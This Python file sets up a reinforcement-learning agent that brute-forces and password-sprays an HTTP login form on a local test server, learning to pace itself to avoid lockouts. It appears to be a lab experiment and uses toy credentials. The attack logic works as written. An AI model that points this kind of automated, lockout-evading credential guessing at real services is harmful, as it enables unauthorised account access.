import numpy as np
import random
import time
from itertools import cycle
from HTTP import HTTPQuery

class CustomEnv:
    def __init__(self):
        self.query_count = 0
        self.plan = "bruteForce"
        self.state = self.default_state()

        # # Load users and passwords from files
        # with open("../Data/100-usernames.txt", "r") as f:
        #     self.users = cycle([line.strip() for line in f])
        # with open("../Data/100-passwords.txt", "r") as f:
        #     self.passwords = cycle([line.strip() for line in f])
        
        self.users = cycle(["user1", "user2", "user3", "user4", "user5", "adejr12"])
        self.passwords = cycle(["pass1", "pass2", "pass3", "pass4", "pass5", "Zbff315"])

        self.current_user = next(self.users)
        self.current_password = next(self.passwords)
        
        self.http_query = HTTPQuery(
            host="http://127.0.0.1:8082",
            default_headers={"Content-Type": "application/x-www-form-urlencoded"},
            post_query="username=${USER}&password=${PASS}",
            path="/login",
            use_post=True,
            use_json=False
        )
        
        self.undetected_attempt_count = 0
        self.total_attempt_count = 0
        
        # Q-learning parameters
        self.q_table = np.zeros((100, 4))
        self.epsilon = 1.0
        self.alpha = 0.1
        self.gamma = 0.9
        self.time_penalty = 0
        self.lockout_prob = 0.05

    def default_state(self):
        return (self.query_count, self.plan)

    def choose_action(self, state):
        if random.uniform(0, 1) < self.epsilon:
            action = random.randint(0, 3)
        else:
            action = np.argmax(self.q_table[self.state_to_index(state)])
        print(f"Choosing action {action} with epsilon {self.epsilon:.2f}")
        return action

    def adjust_epsilon(self):
        self.epsilon = max(0.01, self.epsilon * 0.995)

    def dynamic_timeout(self):
        success_rate = (
            self.undetected_attempt_count / self.total_attempt_count
            if self.total_attempt_count > 0
            else 0
        )
        if success_rate < 0.5:
            self.lockout_prob = min(self.lockout_prob * 1.1, 0.5)
            self.time_penalty = min(self.time_penalty + 1, 6)
        else:
            self.lockout_prob = max(self.lockout_prob * 0.9, 0.01)
            self.time_penalty = max(self.time_penalty - 1, 0)

        print(f"Lockout probability adjusted to {self.lockout_prob:.2f} and time penalty to {self.time_penalty} seconds")

    def step(self, action):
        reward = 0
        done = False

        self.dynamic_timeout()

        if action == 0:
            print("Action: Wait")
            time.sleep(self.time_penalty)
        elif action == 1:
            print("Action: Skip user")
            self.current_user = next(self.users)
        elif action == 2:
            print("Action: Try next password")
            self.current_password = next(self.passwords)
            success, status_code, response_text = self.http_query.perform_query_verbose(
                username=self.current_user,
                password=self.current_password,
                search_string="Welcome"
            )
            self.query_count += 1
            self.total_attempt_count += 1

            if random.uniform(0, 1) < self.lockout_prob:
                status_code = 403

            if success:
                reward += 10
                done = True
                print("Login successful!")
            elif status_code == 403:
                reward -= 10
                print("Lockout detected (403).")
                time.sleep(self.time_penalty)
            else:
                reward += 1
                self.undetected_attempt_count += 1
                print("Attempt failed without lockout.")

        elif action == 3:
            print("Action: Toggle brute force and password spray")
            self.plan = "passwordSpray" if self.plan == "bruteForce" else "bruteForce"

        state_idx = self.state_to_index(self.state)
        next_state_idx = self.state_to_index(self.default_state())
        best_next_action = np.argmax(self.q_table[next_state_idx])
        self.q_table[state_idx, action] += self.alpha * (
            reward + self.gamma * self.q_table[next_state_idx, best_next_action]
            - self.q_table[state_idx, action]
        )

        self.adjust_epsilon()

        self.state = (self.query_count, self.plan)
        print(f"New state: {self.state}, Reward: {reward}, Done: {done}")
        return self.state, reward, done

    def state_to_index(self, state):
        return state[0] * 2 + (0 if state[1] == "bruteForce" else 1)

    def reset(self):
        self.query_count = 0
        self.plan = "bruteForce"
        self.state = self.default_state()
        
        self.current_user = next(self.users)
        self.current_password = next(self.passwords)
        self.undetected_attempt_count = 0
        self.total_attempt_count = 0
        print("Environment reset.")

        # Sleep for default lockout time + 1 second at the beginning of each new episode
        time.sleep(self.time_penalty + 1)

        return self.state

if __name__ == "__main__":
    env = CustomEnv()
    num_episodes = 1000
    max_steps_per_episode = 50
    total_rewards = []

    for episode in range(num_episodes):
        state = env.reset()
        episode_reward = 0

        print(f"=== Starting Episode {episode + 1} ===")

        for step in range(max_steps_per_episode):
            # Choose action based on the current state
            action = env.choose_action(state)
            
            # Perform the chosen action and observe the results
            next_state, reward, done = env.step(action)
            episode_reward += reward

            # Check if the episode is done (i.e., successful login or lockout)
            if done:
                print(f"Episode finished after {step + 1} steps with total reward: {episode_reward}")
                exit() #terminate early to see if we actually successfuly detect login
                break

            # Update state
            state = next_state

        total_rewards.append(episode_reward)
        print(f"Episode {episode + 1} reward: {episode_reward}")

    # Post-training summary
    print("\n=== Training Complete ===")
    print(f"Average reward per episode: {np.mean(total_rewards):.2f}")
    print(f"Highest reward in an episode: {max(total_rewards)}")
    print(f"Lowest reward in an episode: {min(total_rewards)}")
